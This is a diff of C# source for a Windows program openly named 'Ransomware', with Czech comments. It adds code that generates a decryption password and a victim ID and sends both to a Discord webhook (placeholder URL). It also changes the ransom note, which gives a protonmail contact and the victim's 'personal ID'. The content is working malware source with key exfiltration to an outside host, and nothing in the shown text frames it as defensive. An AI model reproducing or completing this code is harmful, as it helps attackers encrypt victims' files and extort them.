@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -9,6 +9,8 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Security.Cryptography;
 using System.IO;
+using System.Collections.Specialized;
+using System.Net;
 
 namespace Ransomware
 {
@@ -22,8 +24,8 @@ namespace Ransomware
         private void Form2_Load(object sender, EventArgs e)
         {
             //Generace hesla
-            
-            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";   
+
+            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             var stringChars = new char[16];
             var random = new Random();
             for (int i = 0; i < stringChars.Length; i++)
@@ -31,21 +33,22 @@ namespace Ransomware
                 stringChars[i] = chars[random.Next(chars.Length)];
             }
             var finalString = new String(stringChars);
+
+            string password = finalString;
             //
 
-            //Generace znaků, která bude přídána k heslu, protože ID uvedené v ransomnotu je heslo k dešifrování
-            var charsa = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            var stringCharsa = new char[34];
-            var randoma = new Random();
-            for (int a = 0; a < stringChars.Length; a++)
-            {
-                stringCharsa[a] = charsa[randoma.Next(charsa.Length)];
-            }
-            var finalStringa = new String(stringCharsa);
-
-            var final = finalString + finalStringa;
+            //Generování ID oběti
+            Random rnd = new Random();
+            int ID = rnd.Next();
             DateTime time = DateTime.Now;
 
+
+            //Odesílání klíče na server
+            string webhook = "https://discord.com/api/webhooks/XXX/XXX";
+            var wbc = new WebClient();
+            var data = new NameValueCollection();
+            data["content"] = "password: " + password + "       " + "ID: " + ID;
+            wbc.UploadValues(webhook, data);
             //
 
             //
@@ -236,7 +239,7 @@ namespace Ransomware
                     str.WriteLine("example@protonmail.com");
                     str.WriteLine("");
 
-                    str.WriteLine("Your personal ID: " + final);
+                    str.WriteLine("Your personal ID: " + ID);
                     str.Flush();
                     System.Diagnostics.Process.Start(@"C:/DIVIS/RANSOMNOTE.txt");
                 }
